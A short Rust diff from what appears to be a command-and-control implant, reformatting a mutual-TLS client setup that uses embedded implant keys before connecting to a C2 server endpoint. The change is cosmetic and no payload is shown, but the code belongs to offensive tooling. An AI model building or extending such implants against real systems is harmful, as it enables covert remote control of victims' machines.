@@ -9,7 +9,12 @@ mod tasks;
 
 fn main() {
     // Configure mutual TLS
-    let config = mtls::client_config(embed::SERVER_ROOTCA, embed::IMPLANT_PUBLIC_KEY, embed::IMPLANT_PRIVATE_KEY).unwrap();
+    let config = mtls::client_config(
+        embed::SERVER_ROOTCA,
+        embed::IMPLANT_PUBLIC_KEY,
+        embed::IMPLANT_PRIVATE_KEY,
+    )
+    .unwrap();
 
     // Point to the C2 server
     let addr = embed::SERVER_ENDPOINT.parse().unwrap();
